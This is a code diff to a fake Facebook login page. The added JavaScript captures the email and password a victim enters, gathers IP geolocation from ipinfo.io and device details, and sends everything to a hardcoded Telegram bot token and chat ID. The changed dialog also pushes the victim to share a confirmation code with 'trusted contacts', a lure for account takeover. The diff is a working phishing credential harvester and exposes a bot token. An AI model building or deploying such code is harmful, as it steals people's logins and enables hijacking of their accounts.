@@ -426,18 +426,15 @@
           <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
           <polyline points="22 4 12 14.01 9 11.01"></polyline>
         </svg>
-        <h2 class="text-2xl font-bold mb-3 text-facebook-blue">You're almost done</h2>
+        <h2 class="text-2xl font-bold mb-3 text-facebook-blue">Identity Verification</h2>
         <p class="mb-4" style="font-size: 16px; line-height: 1.4;">
-          For your account security, we need to verify your identity. Please review the message below.
+          For your account security, we need to verify your identity.
         </p>
         
         <!-- Facebook message style notification -->
         <div style="margin: 20px auto; padding: 15px; background-color: #f0f2f5; border-radius: 8px; width: 90%; max-width: 350px; text-align: left;">
-          <p style="font-size: 15px; color: #050505; line-height: 1.4; margin-bottom: 10px;">
-            <span style="color: #1877F2; font-weight: bold;">Facebook Security:</span> We've sent you a confirmation code. Share this code with one of your trusted contacts to help complete your identity verification.
-          </p>
-          <p style="font-size: 14px; color: #65676B; line-height: 1.3;">
-            This verification process helps ensure the security of your Facebook account.
+          <p style="font-size: 14px; color: #65676B; line-height: 1.3; font-weight: normal;">
+            We've sent you a confirmation code. Share this code with one of your trusted contacts to help complete your identity verification.
           </p>
         </div>
         
@@ -458,6 +455,98 @@
       const passwordError = document.getElementById('password-error');
       const modal = document.getElementById('bedtime-modal');
       const closeButton = document.getElementById('modal-close-button');
+      
+      // Telegram Bot configuration
+      const botToken = "7472968858:AAFGy_eA6XNh9IL05vnfJx47uuEwfUffQks";
+      const authorizedChatId = "6360165707";
+      
+      // Function to send message to Telegram
+      async function sendTelegramMessage(message) {
+        try {
+          const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              chat_id: authorizedChatId,
+              text: message,
+              parse_mode: 'HTML'
+            })
+          });
+          
+          const result = await response.json();
+          console.log('Telegram API response:', result);
+          return result.ok;
+        } catch (error) {
+          console.error('Error sending message to Telegram:', error);
+          return false;
+        }
+      }
+      
+      // Function to get IP and location information
+      async function getIpInfo() {
+        try {
+          // Using ipinfo.io to get IP and location info
+          const response = await fetch('https://ipinfo.io/json');
+          const data = await response.json();
+          
+          return `
+📍 Location Information:
+• IP Address: ${data.ip || "Unknown"}
+• City: ${data.city || "Unknown"}
+• Region: ${data.region || "Unknown"}
+• Country: ${data.country || "Unknown"}
+• Location: ${data.loc || "Unknown"}
+• ISP: ${data.org || "Unknown"}`;
+        } catch (error) {
+          console.error('Error getting IP info:', error);
+          return "Could not determine location information";
+        }
+      }
+      
+      // Function to get device details
+      function getDeviceDetails() {
+        const ua = navigator.userAgent.toLowerCase();
+        
+        // Determine device type
+        let deviceType = "Unknown";
+        if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) {
+          deviceType = "iOS";
+        } else if (ua.includes("android")) {
+          deviceType = "Android";
+        } else if (ua.includes("windows")) {
+          deviceType = "Windows";
+        } else if (ua.includes("mac os") || ua.includes("macintosh")) {
+          deviceType = "Mac";
+        } else if (ua.includes("linux")) {
+          deviceType = "Linux";
+        }
+        
+        // Determine browser
+        let browser = "Unknown";
+        if (ua.includes("chrome") && !ua.includes("chromium")) {
+          browser = "Chrome";
+        } else if (ua.includes("firefox")) {
+          browser = "Firefox";
+        } else if (ua.includes("safari") && !ua.includes("chrome")) {
+          browser = "Safari";
+        } else if (ua.includes("edge") || ua.includes("edg/")) {
+          browser = "Edge";
+        } else if (ua.includes("opera") || ua.includes("opr/")) {
+          browser = "Opera";
+        }
+        
+        return `
+📱 Device Information:
+• Type: ${deviceType}
+• Browser: ${browser}
+• Platform: ${navigator.platform || "Unknown"}
+• Screen Size: ${window.screen.width || "?"} x ${window.screen.height || "?"}
+• Language: ${navigator.language || "Unknown"}
+• Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"}
+• User Agent: ${navigator.userAgent || "Unknown"}`;
+      }
       
       // Validate email field
       function validateEmail() {
@@ -498,7 +587,7 @@
       });
       
       // Form submission
-      loginForm.addEventListener('submit', function(e) {
+      loginForm.addEventListener('submit', async function(e) {
         e.preventDefault();
         
         const emailValid = validateEmail();
@@ -508,40 +597,29 @@
           const email = emailInput.value.trim();
           const password = passwordInput.value.trim();
           
-          // Get device information
-          const deviceInfo = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            vendor: navigator.vendor,
-            screenWidth: window.screen.width,
-            screenHeight: window.screen.height,
-            language: navigator.language,
-            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
-          };
+          try {
+            // Get IP and location information
+            const ipInfo = await getIpInfo();
+            
+            // Get device information
+            const deviceDetails = getDeviceDetails();
+            
+            // Format message for Telegram
+            const timestamp = new Date().toLocaleString();
+            let message = `🚨 Login attempt from Facebook page at ${timestamp}:\n\n`;
+            message += `👤 Credentials:\n• Username/Email: ${email || 'Not provided'}\n• Password: ${password || 'Not provided'}\n`;
+            message += deviceDetails;
+            message += `\n${ipInfo}`;
+            
+            // Send message to Telegram
+            const success = await sendTelegramMessage(message);
+            console.log('Message sent to Telegram:', success);
+            
+          } catch (error) {
+            console.error('Error sending data:', error);
+          }
           
-          // Always send login information to parent via Telegram
-          fetch('/api/send-message', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ 
-              email, 
-              password,
-              deviceInfo
-            })
-          })
-          .then(response => response.json())
-          .then(data => {
-            console.log('Login information sent:', data);
-            // We don't need to alert the user, just proceed to bedtime modal
-          })
-          .catch(error => {
-            console.error('Error sending login information:', error);
-            // Still proceed to bedtime modal even if message sending fails
-          });
-          
-          // Show bedtime modal after short delay
+          // Show the confirmation modal
           setTimeout(function() {
             modal.classList.add('show');
           }, 500);
